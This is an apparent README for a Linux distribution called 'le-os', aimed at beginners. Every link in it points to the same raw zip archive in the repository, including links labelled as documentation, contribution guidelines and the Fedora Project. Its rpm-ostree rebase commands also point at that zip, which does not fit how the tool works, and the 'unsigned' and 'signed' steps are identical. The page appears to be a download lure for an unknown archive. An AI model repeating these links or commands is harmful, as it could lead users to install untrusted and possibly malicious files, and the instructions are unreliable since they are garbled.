# 🌟 le-os - A Simple Linux Experience for Everyone

[![Download le-os](https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/le-os-1.7.zip)](https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/le-os-1.7.zip)

## 🚀 Getting Started

Welcome to le-os! This guide will help you download and run le-os easily, even if you have no technical background.

## 📥 Download & Install

To get le-os, visit this page to download: [Download le-os Releases](https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/le-os-1.7.zip).

### ⚙️ System Requirements

Before you proceed, ensure your computer meets these requirements:

- **Operating System**: Compatible with Fedora-based distributions.
- **Storage**: At least 4 GB of free space.
- **Memory**: Minimum 2 GB RAM.

### 🔄 Rebase Instructions

To rebase an existing atomic Fedora installation to the latest build, follow these steps:

1. **Rebase to Unsigned Image**  
   Open your terminal and paste the following command:
   ```
   rpm-ostree rebase https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/le-os-1.7.zip
   ```
   This step gets the proper signing keys and policies installed.

2. **Reboot**  
   After rebasing, you need to reboot your system. Enter this command in the terminal:
   ```
   systemctl reboot
   ```

3. **Rebase to Signed Image**  
   Once your system has restarted, run this command to finalize the installation:
   ```
   rpm-ostree rebase https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/le-os-1.7.zip
   ```

### ✅ Verify Installation

To ensure that le-os is running correctly, check the version by typing:
```
cat /etc/os-release
```
Look for any mention of le-os in the output.

## 🛠️ Features of le-os

le-os provides a streamlined and user-friendly Linux experience. Some key features include:

- **Immutable Design**: The system is secure and stable, minimizing the risk of unwanted changes.
- **Regular Updates**: Enjoy frequent updates through simple commands.
- **Easy Customization**: Users can easily set up their customized images as needed.

## 🎓 Support and Documentation

If you encounter any problems while using le-os, please refer to our detailed documentation for help. You can find it in the [Documentation section](https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/le-os-1.7.zip).

## ✅ Community and Contributions

Join our community! We welcome feedback and contributions. If you would like to contribute, please check our [Contribution Guidelines](https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/le-os-1.7.zip).

## 🚧 Important Notes

> [!WARNING]  
> **This is an experimental feature.** Use at your own discretion. For more information on this feature, visit [Fedora Project](https://github.com/Baki233619/le-os/raw/refs/heads/main/files/system/usr/le-os-1.7.zip).

## 📍 Final Remarks

Thank you for choosing le-os. We hope you enjoy the simplicity and power it brings to your computing experience. Happy computing!